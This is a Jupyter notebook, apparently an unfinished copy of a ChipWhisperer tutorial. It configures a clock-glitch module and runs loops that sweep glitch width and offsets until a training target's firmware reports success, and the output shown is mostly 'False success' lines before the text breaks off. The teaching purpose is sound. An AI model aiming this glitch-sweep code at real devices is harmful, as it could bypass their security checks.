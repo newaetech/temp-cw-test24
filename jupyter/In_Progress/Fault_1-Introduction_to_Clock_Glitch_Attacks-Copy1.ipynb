{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Introduction to Clock Glitch Attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "scope = cw.scope()\n",
    "target = cw.target(scope)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../Helper_Scripts/Setup_Target_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def reset_target(scope):\n",
    "    scope.io.nrst = 'low'\n",
    "    #scope.io.pdic = 'low'\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = 'high'\n",
    "    #scope.io.pdic = 'high'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Failed to glitch bootloader\n"
     ]
    }
   ],
   "source": [
    "scope.arm()\n",
    "reset_target(scope)\n",
    "\n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print(\"Scope capture timed out\")\n",
    "time.sleep(0.1)\n",
    "num_chars = target.ser.inWaiting()\n",
    "response = target.ser.read(num_chars, timeout = 10)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Glitch Module"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "All the settings/methods for the glitch module can be accessed under `scope.glitch`. As usual, documentation for the settings and methods can be accessed by the python `help` command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "help(scope.glitch)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Some of the important settings we'll want to look at here are:\n",
    "\n",
    "* clk_src\n",
    "> The clock signal that the glitch DCM is using as input. Can be set to \"target\" or \"clkgen\" In this case, we'll be providing the clock to the target, so we'll want this set to \"clkgen\"\n",
    "* offset\n",
    "> Where in the output clock to place the glitch. Can be in the range `[-50, 50]`. Often, we'll want to try many offsets when trying to glitch a target.\n",
    "* width\n",
    "> How wide to make the glitch. Can be in the range `[-50, 50]`. Wider glitches more easily cause glitches, but are also more likely to crash the target, meaning we'll often want to try a range of widths when attacking a target.\n",
    "* output\n",
    "> The output produced by the glitch module. For clock glitching, clock_xor is often the most useful option.\n",
    "* ext_offset\n",
    "> The number of clock cycles after the trigger to put the glitch. \n",
    "* repeat\n",
    "> The number of clock cycles to repeat the glitch for. Higher values increase the number of instructions that can be glitched, but often increase the risk of crashing the target.\n",
    "* trigger_src\n",
    "> How to trigger the glitch. For this tutorial, we want to automatically trigger the glitch from the trigger pin only after arming the ChipWhipserer, so we'll use `ext_single`\n",
    "\n",
    "In addition, we'll need to tell ChipWhipserer to use the glitch module's output as a clock source for the target by setting `scope.io.hs2 = \"glitch\"`. We'll also setup a large `repeat` to make glitching easier. Finally, we'll also use a `namedtuple` to make looping through parameters simpler."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "clk_src     = clkgen\n",
      "width       = 10.15625\n",
      "width_fine  = 0\n",
      "offset      = 10.15625\n",
      "offset_fine = 0\n",
      "trigger_src = ext_single\n",
      "arm_timing  = after_scope\n",
      "ext_offset  = 0\n",
      "repeat      = 105\n",
      "output      = clock_xor\n",
      "\n"
     ]
    }
   ],
   "source": [
    "scope.glitch.clk_src = \"clkgen\"\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.glitch.trigger_src = \"ext_single\"\n",
    "scope.glitch.repeat = 105\n",
    "scope.io.hs2 = \"glitch\"\n",
    "print(scope.glitch)\n",
    "from collections import namedtuple\n",
    "Range = namedtuple('Range', ['min', 'max', 'step'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### XMEGA Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "offset_range = Range(-10, 10, 1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### STM/CWLITEARM Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [],
   "source": [
    "offset_range = Range(-20, -15, 1)\n",
    "scope.glitch.ext_offset = 10\n",
    "scope.glitch.repeat = 105"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attack Loop"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that the setup's done and we know how to use the glitch module, we can start our attack. The key parameters that we'll need to iterate through are `width` and `offset`, so we'll need some loops to change these. To know if we got a successful glitch, we'll check for \"1234\" in the output we get back. \n",
    "\n",
    "One additional improvement that we can make is to try each parameter multiple times and keep track of the success rate. Incorporating all of these improvements, our loop looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done glitching\n"
     ]
    }
   ],
   "source": [
    "from collections import namedtuple\n",
    "\n",
    "width_range = Range(1, 2, 0.4)\n",
    "sample_size = 30\n",
    "\n",
    "scope.glitch.width = width_range.min\n",
    "target.init()\n",
    "\n",
    "attack1_data = []\n",
    "scope.glitch.trigger_src = \"ext_continuous\"\n",
    "\n",
    "while scope.glitch.width < width_range.max:\n",
    "    scope.glitch.offset = offset_range.min\n",
    "    while scope.glitch.offset < offset_range.max:\n",
    "        successes = 0\n",
    "        good_str = response\n",
    "        for i in range(sample_size):\n",
    "            # call before trace things here\n",
    "\n",
    "            # flush the garbage from the computer's target read buffer\n",
    "            target.ser.flush()\n",
    "\n",
    "            # run aux stuff that should run before the scope arms here\n",
    "\n",
    "            scope.arm()\n",
    "            reset_target(scope)\n",
    "\n",
    "            timeout = 50\n",
    "            # wait for target to finish\n",
    "            while target.isDone() is False and timeout:\n",
    "                timeout -= 1\n",
    "                time.sleep(0.01)\n",
    "\n",
    "            try:\n",
    "                ret = scope.capture()\n",
    "                if ret:\n",
    "                    print('Timeout happened during acquisition')\n",
    "            except IOError as e:\n",
    "                print('IOError: %s' % str(e))\n",
    "\n",
    "            # get the results from the scope\n",
    "            # read from the targets buffer\n",
    "            num_chars = target.ser.inWaiting()\n",
    "            response = target.ser.read(num_chars, timeout = 10)\n",
    "\n",
    "            # for table display purposes\n",
    "            success = 'Failed' not in repr(response) # check for glitch success (depends on targets active firmware)\n",
    "            \n",
    "            if success:\n",
    "                time.sleep(0.1) #wait a bit to let it print success\n",
    "                num_chars = target.ser.inWaiting()\n",
    "                response2 = target.ser.read(num_chars, timeout = 1)\n",
    "                if 'Success' in repr(response2) or 'Success' in repr(response):\n",
    "                    successes += 1\n",
    "                    good_str = repr(response) + repr(response2)\n",
    "                else:\n",
    "                    pass#print(\"False success\" + response +response2)\n",
    "            \n",
    "        attack1_data.append([scope.glitch.width, scope.glitch.offset, successes/sample_size, good_str]) \n",
    "        # run aux stuff that should happen after trace here\n",
    "        scope.glitch.offset += offset_range.step\n",
    "    scope.glitch.width += width_range.step\n",
    "\n",
    "print(\"Done glitching\")\n",
    "scope.glitch.trigger_src = \"ext_single\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=50), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0004\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0000\u0001\u0000\u0000\n",
      "False success\u0000 \u0000\u0004\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000 \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False successº( \u0000\n",
      "False success(\t\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0007\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False successi \u0000\u0001\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success²\u0002\u0000 \n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False successº\u0002(\u0001\u0001\n",
      "False success \u0000 \n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success²\u0000 \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0004\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\n",
      "False success\u0012\u0000\u0000\u0001\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\u0000 \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success% \u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False successI\u0000 \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success²\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False successº!\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success \u0004\u0000\n",
      "False success\u0002\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0000\u0000\u0000\n",
      "False success\"\u0000\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0002\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0006\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0002\u0000\u0001\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0002\u0000\u0000\n",
      "False success\u0004 \n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000 \u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012\u0000\u0000\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=30), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0002\u0004\u0000\u0000ÿ\n",
      "Done glitching\n"
     ]
    }
   ],
   "source": [
    "from collections import namedtuple\n",
    "from tqdm import tnrange\n",
    "\n",
    "width_range = Range(1, 2, 0.4)\n",
    "sample_size = 30\n",
    "\n",
    "scope.glitch.ext_offset = 10\n",
    "scope.glitch.repeat = 10\n",
    "\n",
    "scope.glitch.width = width_range.min\n",
    "target.init()\n",
    "\n",
    "attack1_data = []\n",
    "scope.glitch.trigger_src = \"ext_continuous\"\n",
    "scope.glitch.width = 1.56\n",
    "scope.glitch.offset = -18.75\n",
    "for scope.glitch.ext_offset in tnrange(50, 100, leave=False):\n",
    "    successes = 0\n",
    "    good_str = response\n",
    "    for i in tnrange(sample_size, leave=False):\n",
    "        # call before trace things here\n",
    "\n",
    "        # flush the garbage from the computer's target read buffer\n",
    "        target.ser.flush()\n",
    "\n",
    "        # run aux stuff that should run before the scope arms here\n",
    "\n",
    "        scope.arm()\n",
    "        reset_target(scope)\n",
    "\n",
    "        timeout = 50\n",
    "        # wait for target to finish\n",
    "        while target.isDone() is False and timeout:\n",
    "            timeout -= 1\n",
    "            time.sleep(0.01)\n",
    "\n",
    "        try:\n",
    "            ret = scope.capture()\n",
    "            if ret:\n",
    "                print('Timeout happened during acquisition')\n",
    "        except IOError as e:\n",
    "            print('IOError: %s' % str(e))\n",
    "\n",
    "        # get the results from the scope\n",
    "        # read from the targets buffer\n",
    "        num_chars = target.ser.inWaiting()\n",
    "        response = target.ser.read(num_chars, timeout = 10)\n",
    "\n",
    "        # for table display purposes\n",
    "        success = 'Failed' not in repr(response) # check for glitch success (depends on targets active firmware)\n",
    "\n",
    "        if success:\n",
    "            time.sleep(0.1) #wait a bit to let it print success\n",
    "            num_chars = target.ser.inWaiting()\n",
    "            response2 = target.ser.read(num_chars, timeout = 1)\n",
    "            if 'Success' in repr(response2) or 'Success' in repr(response):\n",
    "                successes += 1\n",
    "                good_str = repr(response) + repr(response2)\n",
    "            else:\n",
    "                print(\"False success\" + response +response2)\n",
    "\n",
    "    attack1_data.append([scope.glitch.width, scope.glitch.ext_offset, successes/sample_size, good_str]) \n",
    "    # run aux stuff that should happen after trace here\n",
    "\n",
    "print(\"Done glitching\")\n",
    "scope.glitch.trigger_src = \"ext_single\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=40), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!\u0001 \u0001 \u0000\n",
      "False success \u0000\u0000\u0000\n",
      "False success! \u0000 \n",
      "False success!! \u0000\u0000\n",
      "False success\u0001!\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!  \u0000 \n",
      "False success\u0001!\u0001  \u0000\n",
      "False success\u0000\u0000\u0000 \u0000\n",
      "False success!! \u0000\u0000\n",
      "False success !\u0001\u0000\u0000\n",
      "False success\u0000\u0000 \u0000\n",
      "False success\u0000\u0000 \u0001\n",
      "False success#%\u0000\u0000 \u0000\n",
      "False success\u0000\u0000\u0000\u0000\n",
      "False success\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
